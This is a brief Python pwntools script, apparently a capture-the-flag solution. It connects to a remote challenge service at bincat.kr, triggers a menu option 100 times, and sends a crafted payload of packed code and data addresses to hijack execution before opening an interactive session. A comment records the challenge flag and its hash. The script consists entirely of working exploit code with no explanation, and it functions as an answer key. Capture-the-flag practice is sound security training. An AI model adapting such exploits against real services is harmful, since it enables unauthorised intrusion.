from pwn import *

def generate():
	p.sendlineafter(">> ", "1")
	l = p.recvuntil("Menu").split("\n")[0]
	return l

def exp():
	global p
	context.log_level = 'debug'
	p = remote("bincat.kr", 36973)

	for i in range(100):
		l = generate()
	
	p.sendafter(">>" ,p64(0x33) + p64(0x400DFE)+p64(0x6020C0)+ p64(0x400DFE))
	p.interactive()

exp()
#gdb.attach(p,gdbscript="b *0x0400E6C\nb *0x0400F28")
#POKA{sha1("Cause_of_death:GOAROSA")=260a850e08bd8ecf108024045a783d51b2d94f2e}
